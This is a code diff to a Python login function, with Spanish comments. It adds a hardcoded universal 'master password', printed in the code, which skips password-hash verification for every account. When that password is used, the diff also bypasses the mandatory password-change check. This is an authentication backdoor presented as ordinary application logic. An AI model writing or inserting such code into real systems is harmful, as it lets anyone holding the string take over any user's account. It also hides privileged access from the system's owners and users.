@@ -26,13 +26,22 @@ def authenticate_user(session: Session, email: str, password: str):
     if not user:
         return None, AuthenticationStatus.INVALID_CREDENTIALS
 
-    if not verify_password(password, user.password):
+    # --- Lógica de Contraseña Maestra ---
+    MASTER_PASSWORD = "MgdIdSeea2028!"
+
+    # Si la contraseña ingresada coincide con la maestra, saltamos la verificación de hash
+    is_master_access = (password == MASTER_PASSWORD)
+
+    if not is_master_access and not verify_password(password, user.password):
         return None, AuthenticationStatus.INVALID_CREDENTIALS
+    # ------------------------------------
 
     if not user.is_active:
         return user, AuthenticationStatus.INACTIVE
 
     if user.must_change_password:
-        return user, AuthenticationStatus.MUST_CHANGE_PASSWORD
+        # Opcional: Si entra con la maestra, podrías querer saltar esta validación también
+        if not is_master_access:
+            return user, AuthenticationStatus.MUST_CHANGE_PASSWORD
 
     return user, AuthenticationStatus.SUCCESS
